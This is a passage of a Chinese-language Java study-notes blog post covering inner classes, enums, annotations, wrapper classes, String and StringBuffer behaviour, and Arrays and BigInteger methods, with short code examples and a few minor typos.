class_">B</span>()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title class_">A</span>&#123;&#125;<br>B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br></code></pre></td></tr></table></figure><h2 id="接口、继承"><a href="#接口、继承" class="headerlink" title="接口、继承"></a>接口、继承</h2><p>继承：提高代码复用性和可维护性</p><p>接口：设计好各种方法，让其他类去实现</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AA</span>&#123;<span class="hljs-type">int</span> a=<span class="hljs-number">23</span>;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br><br>main函数中：<br> BB b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>    System.out.println(b.a);<br>    System.out.println(AA.a);<br>    System.out.println(BB.a);<br></code></pre></td></tr></table></figure><h1 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>定义在外部类的成员位置上</p><p>a）成员内部类（无 static 修饰）</p><p>b）静态内部类（使用 static 修饰）</p><p>定义在外部类的局部位置上（比如方法类）：</p><p>a）局部内部类（有类名）</p><p>b）匿名内部类（没有类名）</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的成员位置上，没有 static 修饰</p><h2 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类的所有成员，包含私有的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OuterClass</span>&#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;butterfly&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> sex=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;&#125;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;OuterClass static block&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OuterClass</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClass</span>&#123;<br>        <span class="hljs-keyword">public</span> String language=<span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">abc</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(name);<br>            System.out.println(age);<br>            System.out.println(sex);<br>            test();<br>        &#125;<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;InnerClass block&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">InnerClass</span><span class="hljs-params">(String language)</span>&#123;<br>            <span class="hljs-built_in">this</span>.language=language;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以添加任意访问修饰符去修饰成员内部类，因为相当于一个成员</li><li>成员内部类不能定义静态成员</li><li>作用域与其他成员一样</li><li>外部类可以访问成员内部类</li><li>外部其他类可以访问成员内部类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()..<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();<br></code></pre></td></tr></table></figure><p>​在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.this.成员）去访问</li></ul><h2 id="获取内部类的类名"><a href="#获取内部类的类名" class="headerlink" title="获取内部类的类名"></a>获取内部类的类名</h2><p>getClass、jeb</p><h1 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>有 static 修饰</p><h2 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><p>只能访问外部类的静态成员，包含私有的</p></li><li><p>作用域属于整个类</p></li><li><p>可以添加任意访问修饰符去修饰静态内部类</p></li><li><p>外部类可以访问静态内部类</p></li><li><p>外部其他类可以访问静态内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>.Inner();<br></code></pre></td></tr></table></figure><p>在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.静态成员名）去访问</li></ul></li></ul><h1 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的局部位置上，比如方法中，并且有类名</p><h2 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类所有成员</li><li>如果定义在静态方法中，只能访问外部类的静态成员</li><li>不能添加访问修饰符，可以用final 修饰</li><li>作用域仅在代码块中，与局部变量一致</li><li>重名遵循就近原则，访问外部类成员用<strong>（外部类名.this.成员）</strong>去访问（实例方法中），静态方法中，（外部类名.静态成员名）访问</li><li>外部类不能访问局部内部类</li></ul><h1 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><p>基于接口的匿名内部类</p><p>基于类（抽象类）的匿名内部类</p><h2 id="注意事项-7"><a href="#注意事项-7" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以访问外部类，受访问修饰符影响，局部内部类不能定义静态成员</li><li>只能创建一个实例</li><li>就近原则，匿名内部类处于外部类里面时<strong>（外部类名.this.成员）</strong>静态成员（外部类名.静态类名）</li><li>外部类不能访问匿名内部类</li><li>匿名内部类在定义的同时直接创建对象，并且当作实参传递</li></ul><h1 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h1><h2 id="自定义枚举类"><a href="#自定义枚举类" class="headerlink" title="自定义枚举类"></a>自定义枚举类</h2><ul><li>构造器私有化</li><li>public static final 修饰的属性</li><li>创建对象赋值给这些属性</li><li>定义 toString 方法</li></ul><h2 id="enum-类"><a href="#enum-类" class="headerlink" title="enum 类"></a>enum 类</h2><ul><li>关键字 enum 代替 class</li></ul><h2 id="使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类"><a href="#使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类" class="headerlink" title="使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类"></a>使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类</h2><ul><li>javap 反编译 class</li><li>不能被继承或再继承其他类，但是可以实现接口</li><li>使用 Enum 类相关方法</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Season autumn=Season.AUTUMN;<br><span class="hljs-comment">//name()返回枚举对象的名字</span><br>System.out.println(autumn.name());<br><span class="hljs-comment">//ordinal()返回枚举对象的次序/编号，从0开始编号</span><br>System.out.println(autumn.ordinal());<br><span class="hljs-comment">//values()返回定义的所有枚举对象</span><br>Season[] values=Season.values();<br><span class="hljs-comment">//valueOf()将字符串转换成枚举对象，字符串必须为已有的枚举对象名</span><br>Season autumn1=Season <span class="hljs-title function_">valueOf</span><span class="hljs-params">(<span class="hljs-string">&quot;AUTUMN&quot;</span>)</span>;<br>System.out.println(Season.SUMMER.compareTo(SEason.AUTUMN));<span class="hljs-comment">//两个值相减</span><br><span class="hljs-comment">//toString()</span><br></code></pre></td></tr></table></figure><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h2><p>retrofit2</p><h2 id="基本-Annotation"><a href="#基本-Annotation" class="headerlink" title="基本 Annotation"></a>基本 Annotation</h2><ul><li>@Override：验证方法为重写父类方法，只能用于方法</li><li>@Deprecated：用于表示某个元素（类&#x2F;方法等）已过时</li><li>@SuppressWarnings({“all”})：抑制编译器警告</li></ul><h2 id="注解类"><a href="#注解类" class="headerlink" title="注解类"></a>注解类</h2><ul><li>@Target（ElementType.METHOD），指定注解范围</li><li>@Target 修饰注解的注释，称为元注解</li><li>@interface 是注解类</li></ul><h1 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h1><p>try 包裹可能出现异常代码，catch 去捕获异常，try 出现异常，出现异常的代码后面不会执行</p><h1 id="throws-与-throw"><a href="#throws-与-throw" class="headerlink" title="throws 与 throw"></a>throws 与 throw</h1><p>抛出异常要与父类一致</p><p>throw: 后面跟异常对象</p><p>throws: 做异常处理方式，在方法中</p><h1 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h1><h2 id="包装类型和-String-类型的转换"><a href="#包装类型和-String-类型的转换" class="headerlink" title="包装类型和 String 类型的转换"></a>包装类型和 String 类型的转换</h2><p>a) 包装类型转 String 类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i=<span class="hljs-number">10</span>;<br> String s1=i.toString();<br> String s2=String.valueOf(i);<br> String s3=i+<span class="hljs-string">&quot;&quot;</span>;<br> System.out.println(s1);<br> System.out.println(s2);<br> System.out.println(s3);<br></code></pre></td></tr></table></figure><p>b）String 类型转包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(s1);<br>   Integer i2=Integer.valueOf(s2);<br>   Integer i3=Integer.parseInt(s3);<br>   System.out.println(i1);<br>   System.out.println(i2);<br>   System.out.println(i3);<br></code></pre></td></tr></table></figure><p>c）例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">Object obj1=<span class="hljs-literal">true</span>?<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<span class="hljs-comment">//三元条件运算符是一个整体</span><br>   System.out.println(obj1);<span class="hljs-comment">//1.0</span><br><br>Object obj2;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">true</span>)&#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<br>   &#125;<br>   System.out.println(obj2);<span class="hljs-comment">//1</span><br><br><br>Integer i=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   Integer j=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   System.out.println(i==j);  <span class="hljs-comment">//false</span><br>   <br>   Integer m=<span class="hljs-number">1</span>;<br>   Integer n=<span class="hljs-number">1</span>;<br>   System.out.println(m==n);<span class="hljs-comment">//True,指向同一个对象</span><br>   <br>   Integer x=<span class="hljs-number">128</span>;<br>   Integer y=<span class="hljs-number">128</span>;<br>   System.out.println(x==y);<span class="hljs-comment">//False超过范围，通过new去创建，不等</span><br>   <br>   Integer a=<span class="hljs-number">128</span>;<br>   <span class="hljs-type">int</span> b=<span class="hljs-number">128</span>;<br>   System.out.println(a==b);<span class="hljs-comment">//True,存在基本数据类型，比较的是值</span><br><br></code></pre></td></tr></table></figure><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>final 类，不能被继承</li><li>直接赋值，调用构造器</li><li>属性 private final char value[ ];存放字符串内容</li></ul><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;abcd&quot;</span>;<span class="hljs-comment">//指向常量池</span><br>String b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<span class="hljs-comment">//指向对象，对象指向常量池</span><br>System.out.println(a.equals(b)); <span class="hljs-comment">//True</span><br>System.out.println(a==b);<span class="hljs-comment">//False</span><br></code></pre></td></tr></table></figure><h2 id="常量池字符串"><a href="#常量池字符串" class="headerlink" title="常量池字符串"></a>常量池字符串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String s1=<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-comment">//hellojava</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;hell&quot;</span>;<br>String b=<span class="hljs-string">&quot;jab&quot;</span>;<br>String c=a+b;<span class="hljs-comment">//new 了一个对象</span><br>String d=<span class="hljs-string">&quot;helljab&quot;</span>;<br>System.out.println(c==d);<br><span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">String str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>     <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] ch=&#123;<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>&#125;;<br>     change(str,ch);<br>     System.out.println(str);<br>     System.out.println(ch);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(String str,<span class="hljs-type">char</span> ch[])</span>&#123;<br>     str=<span class="hljs-string">&quot;java&quot;</span>;<br>     ch[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br> &#125;<br> <br> <span class="hljs-comment">//aava</span><br></code></pre></td></tr></table></figure><h1 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">String name=<span class="hljs-string">&quot;我虽然&quot;</span>;<br>String ISO_s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(name.getBytes(StandardCharsets.UTF_8),StandardCharsets.ISO_8859_1);<br>System.out.println(ISO_s);<br>String UTF8_s= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ISO_s.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);<br> System.out.println(UTF8_s);<br></code></pre></td></tr></table></figure><h1 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h1><h2 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h2><ul><li>不能被继承</li><li>父类是 AbstractStringBuilder</li><li>AbstractStringBuilder 有属性 char[] value,存放在堆中</li></ul><h2 id="StingBuffer-和-String-的转换"><a href="#StingBuffer-和-String-的转换" class="headerlink" title="StingBuffer 和 String 的转换"></a>StingBuffer 和 String 的转换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">StringBuffer stringBuffer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<br>stringBuffer=stringBuffer.append(<span class="hljs-string">&quot;ac&quot;</span>)<br>String s=stringBuffer.toString();<br>String ss=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(stringBuffer);<br>System.out.println(s);<br><span class="hljs-comment">//abcdac</span><br></code></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>append，toString</p><h2 id="String、StringBuffer、StringBuider"><a href="#String、StringBuffer、StringBuider" class="headerlink" title="String、StringBuffer、StringBuider"></a>String、StringBuffer、StringBuider</h2><p>StringBuider 效率最高，拼接字符串</p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p> sort 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">Person abc=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">30</span>);<br>        Person umr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;umr&quot;</span>,<span class="hljs-number">23</span>);<br>        Person acd=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;acd&quot;</span>,<span class="hljs-number">40</span>);<br>        Person[] aaa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[]&#123;abc,umr,acd&#125;;<br>        Arrays.sort(aaa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> ((Person)o1) .age -((Person)o2).age;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;);<br>        System.out.println(Arrays.toString(aaa));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>        String name=<span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name=name;<br>            <span class="hljs-built_in">this</span>.age=age;<br>        &#125;<br>        <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//[Person&#123;name=&#x27;umr&#x27;, age=23&#125;, Person&#123;name=&#x27;abc&#x27;, age=30&#125;, Person&#123;name=&#x27;acd&#x27;, age=40&#125;]</span><br></code></pre></td></tr></table></figure><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>Arrays.toString  返回数组的字符串形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] aa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[]&#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br>   Arrays.sort(aa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>               <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (Integer) o1 - (Integer) o2;<br>               <span class="hljs-keyword">return</span> i;<br>           &#125;<br>       &#125;);<br>   System.out.println(Arrays.toString(aa));<br>   <span class="hljs-comment">//[1, 2, 3, 4, 5, 6]</span><br></code></pre></td></tr></table></figure><p>Arrays.sort 自然排序和定制排序（数值排序、对象排序）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">参考前面的 <span class="hljs-built_in">sort</span> 方法例子<br></code></pre></td></tr></table></figure><p>Arrays.copyOf  数组元素的复制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>   <span class="hljs-type">int</span>[] bb=Arrays.copyOf(aa,aa.length);<br>   bb[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>   System.out.println(Arrays.toString(bb));<br></code></pre></td></tr></table></figure><p> Arrays.aslist 数组转化为 List 集合</p><p>Arrays.fill  数组填充</p><p>Arrays.binarySearch 二分查找（有序数组）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">11</span>);<br>        System.out.println(i);<br><span class="hljs-comment">// 10</span><br>前提：有序情况下<br><br>无序时，先排序<br><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>Arrays.sort(aa);<br>    System.out.println(Arrays.toString(aa));<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">2</span>);<br>    System.out.println(i);<br><span class="hljs-comment">//[0, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14]</span><br><span class="hljs-comment">//2</span><br><br>找不到就返回负数，-(low+<span class="hljs-number">1</span>)，low 为原本出现的位置，比如查找 <span class="hljs-number">10</span>，返回 -<span class="hljs-number">11</span> <br></code></pre></td></tr></table></figure><p>System.arraycopy   复制数组</p><p>System. currentTimeMillens( )返回当前距离时间</p><h2 id="BigInteger"><a href="#BigInteger" class="headerlink" title="BigInteger"></a>BigInteger</h2><p>保存比较大的数</p><p>BigDecimal  保存精度更高的小数</p><ul><li>add  加</li><li>subtract 减</li><li>multiply 乘</li><li>divide 除</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">BigInteger bigInteger1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;111111111111111111111111111111111111111&quot;</span>);<br>BigInteger bigInteger2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span 